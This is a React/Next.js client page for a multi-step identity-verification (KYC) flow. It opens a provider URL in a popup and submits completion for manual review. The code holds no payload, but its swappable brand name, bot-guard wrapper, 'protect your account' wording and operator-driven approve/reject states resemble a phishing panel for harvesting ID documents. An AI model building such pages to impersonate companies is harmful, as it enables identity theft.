'use client';

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { Loader2, ExternalLink, AlertCircle } from 'lucide-react';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Store KYC URL for fallback link if popup is blocked
  const [kycUrl, setKycUrl] = useState<string | null>(null);
  const [popupBlocked, setPopupBlocked] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();
      const url = data.kyc_url;

      if (!url) {
        throw new Error('KYC provider is not configured properly');
      }

      // Store the URL for fallback
      setKycUrl(url);

      // Try to open popup
      const popup = window.open(url, '_blank');

      // Check if popup was blocked
      if (!popup || popup.closed || typeof popup.closed === 'undefined') {
        // Popup was blocked - show fallback link
        setPopupBlocked(true);
      }

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    }
  }

  // Manual open for when popup is blocked
  function handleManualOpen() {
    if (kycUrl) {
      window.open(kycUrl, '_blank');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
    setPopupBlocked(false);
    setKycUrl(null);
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting' || isLoading;

  return (
    <BotGuard>
      <div className="card">
        <h1 className="card__title">Identity Verification</h1>
        <form className="login-form" onSubmit={(e) => e.preventDefault()}>
          {/* Waiting State */}
          {isWaiting ? (
            <>
              <p className="agreement-text" style={{ textAlign: 'center', marginTop: 0, marginBottom: '20px' }}>
                Please wait while we verify your identity.
              </p>
              <button className="btn" disabled>
                <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px' }} />
                Verifying...
              </button>
            </>
          ) : (
            <>
              {kycStatus === 'not_started' && (
                <>
                  <p className="agreement-text" style={{ marginTop: 0, marginBottom: '20px' }}>
                    To protect your account, we need to verify your identity.
                  </p>

                  <div className="form-group">
                    <label className="form-label" style={{ marginBottom: '10px' }}>Have ready:</label>
                    <ul style={{ paddingLeft: '20px', fontSize: '14px', lineHeight: '1.5' }}>
                      <li>A valid government-issued ID</li>
                      <li>A device with a camera</li>
                    </ul>
                  </div>

                  {error && (
                    <div style={{ color: '#d32f2f', marginBottom: '16px', fontSize: '14px' }}>
                      {error}
                    </div>
                  )}

                  <button
                    type="button"
                    onClick={handleBeginKYC}
                    className="btn"
                  >
                    Begin Verification
                    <ExternalLink className="btn__icon h-5 w-5" strokeWidth={1.5} />
                  </button>

                  <p className="agreement-text" style={{ fontSize: '12px', marginTop: '10px' }}>
                    Opens in a new window
                  </p>
                </>
              )}

              {kycStatus === 'in_progress' && (
                <>
                  {/* Popup blocked fallback */}
                  {popupBlocked && kycUrl && (
                    <div className="popup-blocked-notice" style={{ marginBottom: '20px', padding: '12px', backgroundColor: '#fff3cd', borderRadius: '4px' }}>
                      <p style={{ fontSize: '14px', marginBottom: '8px' }}>
                        <strong>Pop-up blocked?</strong> Click the link below to open the verification page:
                      </p>
                      <a
                        href={kycUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        style={{ display: 'inline-flex', alignItems: 'center', color: 'var(--color-text-link)', textDecoration: 'underline' }}
                        onClick={() => setPopupBlocked(false)}
                      >
                        Open Verification Page
                        <ExternalLink className="h-4 w-4" style={{ marginLeft: '6px' }} />
                      </a>
                    </div>
                  )}

                  <p className="agreement-text" style={{ marginTop: popupBlocked ? '16px' : '0', marginBottom: '20px' }}>
                    Complete the verification in the new window, then click Continue.
                  </p>

                  {error && (
                    <div style={{ color: '#d32f2f', marginBottom: '16px', fontSize: '14px' }}>
                      {error}
                    </div>
                  )}

                  <button
                    type="button"
                    onClick={handleKYCCompleted}
                    className="btn"
                    disabled={isLoading}
                  >
                    {isLoading && <Loader2 className="h-4 w-4 animate-spin" style={{ marginRight: '8px' }} />}
                    {isLoading ? 'Submitting...' : 'Continue'}
                  </button>

                  <button
                    type="button"
                    onClick={handleRetry}
                    disabled={isLoading}
                    style={{ background: 'none', border: 'none', color: 'var(--color-text-link)', textDecoration: 'underline', width: '100%', marginTop: '16px', cursor: 'pointer', fontSize: '14px' }}
                  >
                    Start over
                  </button>
                </>
              )}
            </>
          )}

          <div style={{ marginTop: '24px', textAlign: 'center', fontSize: '14px' }}>
            Need help? Contact {currentBrand.companyName} support
          </div>
        </form>
      </div>
    </BotGuard>
  );
}
